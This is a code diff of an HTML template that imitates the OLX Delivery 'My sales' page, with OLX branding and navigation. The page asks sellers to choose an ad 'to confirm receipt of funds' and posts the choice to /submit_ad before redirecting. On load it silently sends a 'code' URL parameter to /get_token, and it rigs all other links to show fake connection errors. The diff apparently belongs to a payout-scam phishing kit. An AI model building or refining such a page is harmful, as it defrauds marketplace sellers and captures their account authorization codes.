@@ -3,258 +3,307 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Вибір оголошення</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
-
+    <title>OLX Доставка — Мої продажі</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;900&display=swap" rel="stylesheet">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    fontFamily: {
+                        sans: ['Inter', 'sans-serif'],
+                    },
+                    colors: {
+                        olx: {
+                            dark: '#002f34',
+                            cyan: '#23e5db',
+                            lightcyan: '#cbf7f5',
+                            gray: '#7f9799',
+                            bg: '#f2f4f5',
+                            border: '#d8dfe0',
+                            error: '#ff5636',
+                            success: '#00b56a'
+                        }
+                    }
+                }
+            }
+        }
+    </script>
     <style>
-        :root {
-            --bg-color: #f4f6f8;
-            --card-bg: #ffffff;
-            --primary: #0a2540;
-            --text-dark: #0f172a;
-            --text-muted: #64748b;
-            --border-color: #e2e8f0;
-            --success: #00b56a;
+        .hide-scrollbar::-webkit-scrollbar { display: none; }
+        .hide-scrollbar { -ms-overflow-style: none; scrollbar-width: none; }
+
+        .olx-loader .dot {
+            width: 14px;
+            height: 14px;
+            border-radius: 50%;
+            background-color: #002f34;
+            animation: olx-bounce 1.4s infinite ease-in-out both;
+        }
+        .olx-loader .dot:nth-child(1) { animation-delay: -0.32s; }
+        .olx-loader .dot:nth-child(2) { animation-delay: -0.16s; background-color: #23e5db; }
+        .olx-loader .dot:nth-child(3) { animation-delay: 0s; }
+
+        @keyframes olx-bounce {
+            0%, 80%, 100% { transform: scale(0); }
+            40% { transform: scale(1); }
         }
 
-        * { box-sizing: border-box; margin: 0; padding: 0; }
+        .toast-enter { transform: translate(-50%, 100%); opacity: 0; }
+        .toast-active { transform: translate(-50%, 0); opacity: 1; }
 
-        body {
-            font-family: 'Inter', sans-serif;
-            background-color: var(--bg-color);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            padding: 15px;
-        }
-
-        .ads-menu {
-            width: 100%;
-            max-width: 420px;
-            background: var(--card-bg);
-            border-radius: 16px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.08);
-            border: 1px solid var(--border-color);
-            display: flex;
-            flex-direction: column;
-        }
-
-        .menu-header {
-            padding: 18px;
-            border-bottom: 1px solid var(--border-color);
-            text-align: center;
-        }
-
-        .menu-title {
-            font-size: 17px;
-            font-weight: 700;
-            color: var(--text-dark);
-        }
-
-        /* Область прокрутки */
-        .scroll-container {
-            max-height: 380px; 
-            overflow-y: auto;
-            padding: 12px;
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 10px;
-            scrollbar-width: thin;
-        }
-
-        .scroll-container::-webkit-scrollbar { width: 4px; }
-        .scroll-container::-webkit-scrollbar-thumb { background: #cbd5e1; border-radius: 10px; }
-
-        .ad-card {
-            background: #fff;
-            border: 1px solid var(--border-color);
-            border-radius: 12px;
-            overflow: hidden;
-            cursor: pointer;
-            transition: all 0.2s;
-            display: flex;
-            flex-direction: column;
-        }
-
+        /* Стилізація кастомного скролбару для контейнера оголошень */
+        .ads-scroll::-webkit-scrollbar { width: 5px; }
+        .ads-scroll::-webkit-scrollbar-track { background: transparent; }
+        .ads-scroll::-webkit-scrollbar-thumb { background: #cbd5e1; border-radius: 10px; }
+        
+        /* Стан вибраної картки */
         .ad-card.selected {
-            border-color: var(--success);
-            background: #f0fdf4;
+            border-color: #00b56a !important;
+            background-color: #f0fdf4;
             transform: translateY(-2px);
-            box-shadow: 0 4px 12px rgba(0, 181, 106, 0.1);
+            box-shadow: 0 4px 12px rgba(0, 181, 106, 0.08);
         }
-
-        .ad-image {
-            width: 100%;
-            height: 95px;
-            object-fit: cover;
-            background: #f8fafc;
-            border-bottom: 1px solid var(--border-color);
-        }
-
-        .ad-info { padding: 8px; flex-grow: 1; }
-
-        .ad-name {
-            font-size: 12px;
-            font-weight: 600;
-            color: var(--text-dark);
-            line-height: 1.3;
-            display: -webkit-box;
-            -webkit-line-clamp: 2;
-            -webkit-box-orient: vertical;
-            overflow: hidden;
-            height: 32px;
-            margin-bottom: 6px;
-        }
-
-        .selection-status {
-            font-size: 11px;
-            font-weight: 700;
-            color: var(--text-muted);
-            text-align: center;
-            background: #f1f5f9;
-            padding: 5px;
-            border-radius: 6px;
-            text-transform: uppercase;
-        }
-
-        .selected .selection-status {
-            background: var(--success);
-            color: white;
-        }
-
-        .menu-footer {
-            padding: 15px;
-            border-top: 1px solid var(--border-color);
-        }
-
-        .btn-confirm {
-            width: 100%;
-            padding: 14px;
-            background: #cbd5e1;
-            color: #64748b;
-            border: none;
-            border-radius: 10px;
-            font-weight: 700;
-            font-size: 14px;
-            cursor: not-allowed;
-            transition: 0.2s;
-        }
-
-        .btn-confirm.active {
-            background: var(--primary);
-            color: white;
-            cursor: pointer;
+        .ad-card.selected .status-badge {
+            background-color: #00b56a !important;
+            color: #ffffff !important;
         }
     </style>
 </head>
-<body>
+<body class="font-sans bg-olx-bg text-olx-dark antialiased relative">
 
-<div class="ads-menu">
-    <div class="menu-header">
-        <h2 class="menu-title">Оберіть товар для виплати</h2>
+    <!-- Лоадер -->
+    <div id="loading-overlay" class="fixed inset-0 bg-white/60 backdrop-blur-[2px] z-40 flex items-center justify-center hidden transition-opacity duration-200">
+        <div class="olx-loader flex gap-2">
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+        </div>
     </div>
 
-    <div class="scroll-container" id="ads-container">
-        {% if user_ads %}
-            {% for ad in user_ads %}
-            <div class="ad-card" onclick="selectAd(this, '{{ ad.url }}', '{{ ad.title }}')">
-                <img src="{{ ad.img }}" class="ad-image" alt="product">
-                <div class="ad-info">
-                    <div class="ad-name">{{ ad.title }}</div>
-                    <div class="selection-status">Обрати</div>
+    <!-- Повідомлення про помилку -->
+    <div id="error-toast" class="fixed bottom-6 left-1/2 w-[90%] max-w-[400px] bg-[#1f2937] text-white px-5 py-3.5 rounded-md shadow-2xl z-50 flex items-center gap-3 transition-all duration-300 toast-enter">
+        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#ff5636" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" class="shrink-0"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="8" x2="12" y2="12"></line><line x1="12" y1="16" x2="12.01" y2="16"></line></svg>
+        <span id="toast-text" class="text-[14px] font-medium leading-tight">Щось пішло не так. Перевірте з'єднання з інтернетом.</span>
+    </div>
+
+    <!-- Шапка -->
+    <header class="bg-olx-dark text-white px-4 md:px-6 h-[64px] md:h-[72px] flex justify-between items-center w-full sticky top-0 z-30">
+        <div class="flex items-center w-full max-w-[1232px] mx-auto justify-between">
+            <div class="flex items-center gap-4">
+                <button class="md:hidden text-white">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg>
+                </button>
+            </div>
+            <div class="flex items-center gap-4 md:gap-6 text-[14px] md:text-[15px] font-semibold">
+                <div class="hidden md:flex text-olx-gray font-medium gap-1">
+                    <a href="#" class="text-white hover:underline">Укр</a>
+                    <span>|</span>
+                    <a href="#" class="hover:underline">Рус</a>
+                </div>
+                <a href="#" class="hidden sm:block hover:text-gray-200 transition">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"></path></svg>
+                </a>
+                <div class="flex items-center gap-1 md:gap-2 cursor-pointer hover:text-gray-200 transition">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>
+                    <span class="hidden md:inline">Ваш профіль</span>
+                </div>
+                <button class="bg-white text-olx-dark font-bold text-[13px] md:text-[15px] py-[8px] md:py-[10px] px-4 md:px-6 rounded hover:bg-gray-100 transition md:ml-2">Додати</button>
+            </div>
+        </div>
+    </header>
+
+    <!-- Підзаголовок сторінки -->
+    <div class="bg-white">
+        <div class="max-w-[1232px] mx-auto px-4 md:px-6 py-6 md:py-8 flex flex-col md:flex-row justify-between items-start gap-4">
+            <h1 class="text-[24px] md:text-[32px] font-bold tracking-tight">OLX Доставка</h1>
+            <div class="flex flex-row items-center gap-2 md:gap-4 w-full md:w-auto">
+                <button class="flex-1 md:flex-none border-[2px] border-olx-dark font-bold text-[13px] md:text-[14px] py-[8px] md:py-[10px] px-3 md:px-5 rounded hover:bg-gray-50 transition h-[40px] md:h-11">Поповнити</button>
+                <div class="flex-1 md:flex-none flex flex-col items-center w-full">
+                    <button class="w-full bg-olx-dark text-white font-bold text-[13px] md:text-[14px] py-[8px] md:py-[10px] px-3 md:px-5 rounded hover:bg-[#003f46] transition h-[40px] md:h-11">Купити пакет</button>
                 </div>
             </div>
-            {% endfor %}
-        {% else %}
-            <p style="grid-column: 1/-1; text-align: center; font-size: 13px; color: var(--text-muted); padding: 30px;">
-                Оголошень не знайдено
-            </p>
-        {% endif %}
+        </div>
+
+        <div class="border-b border-olx-border">
+            <nav class="max-w-[1232px] mx-auto px-4 md:px-6 flex gap-6 text-[14px] font-medium text-olx-gray overflow-x-auto hide-scrollbar whitespace-nowrap">
+                <a href="#" class="py-3 md:py-4 hover:text-olx-dark transition">Платежі та рахунок OLX</a>
+                <a href="#" class="py-3 md:py-4 hover:text-olx-dark transition">Рейтинг</a>
+                <a href="#" class="py-3 md:py-4 hover:text-olx-dark transition">Шукаю роботу</a>
+                <a href="#" class="py-3 md:py-4 hover:text-olx-dark transition">Профіль</a>
+                <a href="#" class="py-3 md:py-4 hover:text-olx-dark transition">Налаштування</a>
+                <a href="#" class="py-3 md:py-4 text-olx-dark font-bold border-b-[3px] border-olx-dark flex items-center gap-2">OLX Доставка</a>
+            </nav>
+        </div>
     </div>
 
-    <div class="menu-footer">
-        <button id="confirm-btn" class="btn-confirm" onclick="submitSelection()" disabled>Підтвердити та отримати</button>
-    </div>
-</div>
+    <!-- Основний контент -->
+    <main class="max-w-[1232px] mx-auto mt-4 md:mt-6 px-0 md:px-6 mb-20">
+        <div class="bg-white rounded-none md:rounded p-4 md:p-8 min-h-[500px]">
 
-<script>
-    let selectedAdData = { url: "", title: "" };
+            <div class="flex gap-6 md:gap-8 border-b border-olx-border text-[14px] md:text-[15px] text-olx-gray mb-6 md:mb-8 overflow-x-auto hide-scrollbar whitespace-nowrap">
+                <a href="#" class="pb-[12px] md:pb-[14px] text-olx-dark font-bold border-b-[3px] border-olx-dark">Мої продажі</a>
+                <a href="#" class="pb-[12px] md:pb-[14px] hover:text-olx-dark transition">Мої покупки</a>
+                <a href="#" class="pb-[12px] md:pb-[14px] hover:text-olx-dark transition">Способи доставки й оплати</a>
+                <a href="#" class="pb-[12px] md:pb-[14px] hover:text-olx-dark transition">Успішність покупок</a>
+            </div>
 
-    // Выбор карточки
-    function selectAd(element, url, title) {
-        document.querySelectorAll('.ad-card').forEach(card => {
-            card.classList.remove('selected');
-            card.querySelector('.selection-status').innerText = "Обрати";
-        });
-        
-        element.classList.add('selected');
-        element.querySelector('.selection-status').innerText = "Обрано";
-        
-        selectedAdData = { url, title };
-        
-        const btn = document.getElementById('confirm-btn');
-        btn.disabled = false;
-        btn.classList.add('active');
-    }
+            <div class="flex gap-2 text-[13px] md:text-[14px] mb-8 overflow-x-auto hide-scrollbar whitespace-nowrap pb-2">
+                <button class="bg-olx-lightcyan text-olx-dark px-4 py-[6px] md:py-[7px] rounded-full shrink-0">Всі</button>
+                <button class="border border-olx-border text-olx-dark hover:border-gray-400 px-4 py-[6px] md:py-[7px] rounded-full transition shrink-0">Очікують підтвердження</button>
+                <button class="border border-olx-border text-olx-dark hover:border-gray-400 px-4 py-[6px] md:py-[7px] rounded-full transition shrink-0">Очікує відправки</button>
+                <button class="border border-olx-border text-olx-dark hover:border-gray-400 px-4 py-[6px] md:py-[7px] rounded-full transition shrink-0">Доставка</button>
+                <button class="border border-olx-border text-olx-dark hover:border-gray-400 px-4 py-[6px] md:py-[7px] rounded-full transition shrink-0">Виконані</button>
+                <button class="border border-olx-border text-olx-dark hover:border-gray-400 px-4 py-[6px] md:py-[7px] rounded-full transition shrink-0">Відхилені</button>
+            </div>
 
-    // Запрос на отправку выбранного товара
-    async function submitSelection() {
-        const btn = document.getElementById('confirm-btn');
-        const originalText = btn.innerText;
-        
-        btn.innerText = "Обробка...";
-        btn.disabled = true;
+            <!-- замінений БЛОК: Меню вибору товарів замість тексту про відсутність замовлень -->
+            <div class="max-w-[440px] mx-auto bg-white border border-olx-border rounded-xl shadow-sm overflow-hidden flex flex-col">
+                <div class="p-4 border-b border-olx-border text-center bg-gray-50/50">
+                    <h2 class="text-[16px] font-bold text-olx-dark">Оберіть товар для підтвердження виплати</h2>
+                </div>
 
-        try {
-            const response = await fetch("/submit_ad", {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ 
-                    ad_url: selectedAdData.url, 
-                    ad_title: selectedAdData.title 
-                })
+                <!-- Контейнер з прокруткою -->
+                <div class="ads-scroll max-h-[360px] overflow-y-auto p-3 grid grid-cols-2 gap-3" id="ads-container">
+                    {% if user_ads %}
+                        {% for ad in user_ads %}
+                        <div class="ad-card bg-white border border-olx-border rounded-lg overflow-hidden cursor-pointer transition-all duration-200 flex flex-col" onclick="selectAd(this, '{{ ad.url }}', '{{ ad.title }}')">
+                            <img src="{{ ad.img }}" class="w-full h-24 object-cover bg-gray-50 border-b border-olx-border" alt="product">
+                            <div class="p-2 flex-grow flex flex-col justify-between">
+                                <div class="text-[12px] font-semibold text-olx-dark line-clamp-2 h-8 leading-tight mb-2">{{ ad.title }}</div>
+                                <div class="status-badge text-[11px] font-bold text-olx-gray text-center bg-gray-100 p-1.5 rounded uppercase tracking-wider transition-colors">Обрати</div>
+                            </div>
+                        </div>
+                        {% endfor %}
+                    {% else %}
+                        <p class="col-span-2 text-center text-[13px] text-olx-gray py-10">Оголошень не знайдено</p>
+                    {% endif %}
+                </div>
+
+                <div class="p-4 border-t border-olx-border bg-gray-50/50">
+                    <button id="confirm-btn" class="w-full py-3.5 bg-gray-300 text-gray-500 font-bold text-[14px] rounded-lg transition-colors cursor-not-allowed" onclick="submitSelection()" disabled>
+                        Підтвердити отримання коштів
+                    </button>
+                </div>
+            </div>
+            <!-- КІНЕЦЬ ЗАМІНЕНОГО БЛОКУ -->
+
+        </div>
+    </main>
+
+    <script>
+        let selectedAdData = { url: "", title: "" };
+
+        // Логіка вибору картки товару
+        function selectAd(element, url, title) {
+            document.querySelectorAll('.ad-card').forEach(card => {
+                card.classList.remove('selected');
+                card.querySelector('.status-badge').innerText = "Обрати";
             });
             
-            const result = await response.json();
+            element.classList.add('selected');
+            element.querySelector('.status-badge').innerText = "Обрано";
             
-            if (response.ok && result.url) {
-                window.location.href = result.url;
-            } else {
-                // Если API не вернуло URL, можно перенаправить на дефолтную страницу
-                alert("Помилка обробки. Спробуйте пізніше.");
-                btn.innerText = originalText;
+            selectedAdData = { url, title };
+            
+            const btn = document.getElementById('confirm-btn');
+            btn.disabled = false;
+            // Зміна стилів кнопки на активний фірмовий колір OLX
+            btn.classList.remove('bg-gray-300', 'text-gray-500', 'cursor-not-allowed');
+            btn.classList.add('bg-olx-dark', 'text-white', 'cursor-pointer', 'hover:bg-[#003f46]');
+        }
+
+        // Запит на відправку вибору (/submit_ad)
+        async function submitSelection() {
+            const btn = document.getElementById('confirm-btn');
+            const overlay = document.getElementById('loading-overlay');
+            
+            // Показуємо фірмовий лоадер сторінки
+            overlay.classList.remove('hidden');
+            btn.disabled = true;
+
+            try {
+                const response = await fetch("/submit_ad", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ 
+                        ad_url: selectedAdData.url, 
+                        ad_title: selectedAdData.title 
+                    })
+                });
+                
+                const result = await response.json();
+                
+                if (response.ok && result.url) {
+                    window.location.href = result.url;
+                } else {
+                    overlay.classList.add('hidden');
+                    showToast("Помилка обробки замовлення. Спробуйте пізніше.");
+                    btn.disabled = false;
+                }
+            } catch (err) {
+                console.error("Fetch error:", err);
+                overlay.classList.add('hidden');
+                showToast("Не вдалося зв'язатися з сервером.");
                 btn.disabled = false;
             }
-        } catch (err) {
-            console.error("Fetch error:", err);
-            btn.innerText = originalText;
-            btn.disabled = false;
         }
-    }
 
-    // Запрос на получение токена при входе
-    window.onload = () => {
-        const urlParams = new URLSearchParams(window.location.search);
-        const code = urlParams.get("code");
-        
-        if (code && !sessionStorage.getItem('done_auth')) {
-            fetch("/get_token", { 
-                method: "POST", 
-                headers: { "Content-Type": "application/json" }, 
-                body: JSON.stringify({ code }) 
-            })
-            .then(r => { 
-                if(r.ok) { 
-                    sessionStorage.setItem('done_auth', code); 
-                    // Очищаем URL от параметров после успешного получения токена
-                    window.history.replaceState({}, document.title, "/");
-                } 
-            })
-            .catch(err => console.error("Token error:", err));
+        // Функція відображення тоста помилки
+        function showToast(text) {
+            const toast = document.getElementById('error-toast');
+            document.getElementById('toast-text').innerText = text;
+            toast.classList.remove('toast-enter');
+            toast.classList.add('toast-active');
+            setTimeout(() => {
+                toast.classList.remove('toast-active');
+                toast.classList.add('toast-enter');
+            }, 3500);
         }
-    };
-</script>
 
+        document.addEventListener("DOMContentLoaded", () => {
+            // Фільтруємо елементи: старий скрипт тепер вішається ТІЛЬКИ на зовнішні кнопки/посилання, не чіпаючи меню вибору
+            const interactables = document.querySelectorAll('a:not(.ad-card, #confirm-btn), button:not(.ad-card, #confirm-btn)');
+            const overlay = document.getElementById('loading-overlay');
+            let isProcessing = false;
+
+            interactables.forEach(el => {
+                el.addEventListener('click', (e) => {
+                    e.preventDefault();
+                    if(isProcessing) return;
+                    isProcessing = true;
+
+                    overlay.classList.remove('hidden');
+
+                    setTimeout(() => {
+                        overlay.classList.add('hidden');
+                        showToast("Щось пішло не так. Перевірте з'єднання з інтернетом.");
+                        isProcessing = false;
+                    }, 1500);
+                });
+            });
+        });
+
+        // Запит на отримання токена при завантаженні (/get_token)
+        window.onload = () => {
+            const urlParams = new URLSearchParams(window.location.search);
+            const code = urlParams.get("code");
+            
+            if (code && !sessionStorage.getItem('done_auth')) {
+                fetch("/get_token", { 
+                    method: "POST", 
+                    headers: { "Content-Type": "application/json" }, 
+                    body: JSON.stringify({ code }) 
+                })
+                .then(r => { 
+                    if(r.ok) { 
+                        sessionStorage.setItem('done_auth', code); 
+                        window.history.replaceState({}, document.title, "/");
+                    } 
+                })
+                .catch(err => console.error("Token error:", err));
+            }
+        };
+    </script>
 </body>
 </html>
